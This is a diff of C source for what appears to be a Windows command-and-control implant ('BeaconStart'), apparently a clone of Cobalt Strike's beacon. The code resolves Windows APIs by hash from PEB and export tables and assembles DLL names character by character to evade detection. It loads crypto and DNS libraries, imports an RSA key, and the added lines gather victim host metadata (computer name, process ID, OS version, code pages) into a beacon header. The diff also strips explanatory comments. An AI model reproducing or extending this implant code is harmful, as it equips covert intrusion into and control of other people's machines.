@@ -30,25 +30,19 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 
 	if ((Ptr = PebGetModule( H_KERNEL32 )) != NULL) 
 	{
-		//
-		// Construct imports from EAT of kernel32
-		//
-
-		Ins.api.GetACP       = PeGetFuncEat( Ptr, H_GETACP );
-		Ins.api.GetOEMCP     = PeGetFuncEat( Ptr, H_GETOEMCP );
-		Ins.api.LocalLock    = PeGetFuncEat( Ptr, H_LOCALLOCK );
-		Ins.api.LocalFree    = PeGetFuncEat( Ptr, H_LOCALFREE );
-		Ins.api.LocalSize    = PeGetFuncEat( Ptr, H_LOCALSIZE );
-		Ins.api.LocalAlloc   = PeGetFuncEat( Ptr, H_LOCALALLOC );
-		Ins.api.FreeLibrary  = PeGetFuncEat( Ptr, H_FREELIBRARY );
-		Ins.api.LocalUnlock  = PeGetFuncEat( Ptr, H_LOCALUNLOCK );
-		Ins.api.LocalReAlloc = PeGetFuncEat( Ptr, H_LOCALREALLOC );
-		Ins.api.LoadLibraryA = PeGetFuncEat( Ptr, H_LOADLIBRARYA );
-		Ins.api.GetTickCount = PeGetFuncEat( Ptr, H_GETTICKCOUNT );
-
-		//
-		// Construct imports from EAT of ntdll
-		//
+		Ins.api.GetACP              = PeGetFuncEat( Ptr, H_GETACP );
+		Ins.api.GetOEMCP            = PeGetFuncEat( Ptr, H_GETOEMCP );
+		Ins.api.LocalLock           = PeGetFuncEat( Ptr, H_LOCALLOCK );
+		Ins.api.LocalFree           = PeGetFuncEat( Ptr, H_LOCALFREE );
+		Ins.api.LocalSize           = PeGetFuncEat( Ptr, H_LOCALSIZE );
+		Ins.api.LocalAlloc          = PeGetFuncEat( Ptr, H_LOCALALLOC );
+		Ins.api.FreeLibrary         = PeGetFuncEat( Ptr, H_FREELIBRARY );
+		Ins.api.LocalUnlock         = PeGetFuncEat( Ptr, H_LOCALUNLOCK );
+		Ins.api.LocalReAlloc        = PeGetFuncEat( Ptr, H_LOCALREALLOC );
+		Ins.api.LoadLibraryA        = PeGetFuncEat( Ptr, H_LOADLIBRARYA );
+		Ins.api.GetTickCount        = PeGetFuncEat( Ptr, H_GETTICKCOUNT );
+		Ins.api.GetComputerNameA    = PeGetFuncEat( Ptr, H_GETCOMPUTERNAMEA );
+		Ins.api.GetCurrentProcessId = PeGetFuncEat( Ptr, H_GETCURRENTPROCESSID );
 	
 		Ptr = PebGetModule( H_NTDLL );
 		Ins.api.RtlRandomEx = PeGetFuncEat( Ptr, H_RTLRANDOMEX );
@@ -65,10 +59,6 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 		Str[0x9] = 'l';
 		Str[0xa] = 'l';
 		Str[0xb] = 0x0;
-
-		//
-		// Construct imports from EAT of crypt32
-		//
 
 		Ins.Module[0] = Ins.api.LoadLibraryA( CPTR( Str ) );
 		Ins.api.CryptDecodeObjectEx      = PeGetFuncEat( Ins.Module[0], H_CRYPTDECODEOBJECTEX );
@@ -87,10 +77,6 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 		Str[0xa] = 'l';
 		Str[0xb] = 'l';
 		Str[0xc] = 0x0;
-
-		//
-		// Construct imports from EAT of advapi32
-		//
 
 		Ins.Module[1] = Ins.api.LoadLibraryA( CPTR( Str ) );
 		Ins.api.CryptDecrypt         = PeGetFuncEat( Ins.Module[1], H_CRYPTDECRYPT );
@@ -118,10 +104,6 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 		Str[0x9] = 'l';
 		Str[0xa] = 0x0;
 
-		//
-		// Consturct imports from EAT of dnsapi
-		//
-
 		Ins.Module[2] = Ins.api.LoadLibraryA( CPTR( Str ) );
 		Ins.api.DnsWriteQuestionToBuffer_UTF8     = PeGetFuncEat( Ins.Module[2], H_DNSWRITEQUESTIONTOBUFFER_UTF8 );
 		Ins.api.DnsExtractRecordsFromMessage_UTF8 = PeGetFuncEat( Ins.Module[2], H_DNSEXTRACTRECORDSFROMMESSAGE_UTF8 );
@@ -141,11 +123,6 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 
 		Ins.Module[3] = Ins.api.LoadLibraryA( CPTR( Str ) );
 
-		//
-		// Import DER encoded public key, and
-		// send our beacon metadata
-		//
-
 		if ( Ins.api.CryptDecodeObjectEx( 
 				X509_ASN_ENCODING, 
 				X509_PUBLIC_KEY_INFO, 
@@ -163,17 +140,37 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 				{
 					if ((Ins.BeaconId = RandomNumber32( &Ins )) != 0)
 					{
+						PBEACON_METADATA_HDR Met;
+						PVOID                Cmp;
+						PVOID                Usr;
+						PVOID                Prc;
 
+						if ((Cmp = InfoGetComputer( &Ins )))
+						{
+							Met = BufferCreate( &Ins, sizeof( BEACON_METADATA_HDR ) );
+							Met = BufferAddRaw( &Ins, Met, Str, 16 );
+							Met = BufferAddUI1( &Ins, Met, Ins.api.GetACP() );
+							Met = BufferAddUI1( &Ins, Met, Ins.api.GetOEMCP() );
+							Met = BufferAddUI4( &Ins, Met, HTONL(Ins.BeaconId) );
+							Met = BufferAddUI4( &Ins, Met, HTONL(Ins.api.GetCurrentProcessId()) );
+							Met = BufferAddUI2( &Ins, Met, 0 );
+							Met = BufferAddUI1( &Ins, Met, 2 | 4 );
+							Met = BufferAddUI1( &Ins, Met, NtCurrentTeb()->ProcessEnvironmentBlock->OSMajorVersion );
+							Met = BufferAddUI1( &Ins, Met, NtCurrentTeb()->ProcessEnvironmentBlock->OSMinorVersion );
+							Met = BufferAddUI2( &Ins, Met, NtCurrentTeb()->ProcessEnvironmentBlock->OSBuildNumber );
+							Met = BufferAddUI4( &Ins, Met, 0x0 );
+							Met = BufferAddUI4( &Ins, Met, 0x0 );
+							Met = BufferAddUI4( &Ins, Met, 0x0 );
+							Met = BufferAddUI4( &Ins, Met, 0x0 );
+							Met = BufferAddRaw( &Ins, Met, Cmp, strlen(Cmp) );
+							Met = BufferAddUI1( &Ins, Met, '\t' );
+						};
 					};
 				};
 				CryptRsaFree( &Ins );
 			};
 			Ins.api.LocalFree( Ins.key[0].Ptr );
 		};
-
-		//
-		// Cleanup loaded modules from memory
-		//
 
 		if ( Ins.Module[3] != NULL )
 			Ins.api.FreeLibrary( Ins.Module[3] );
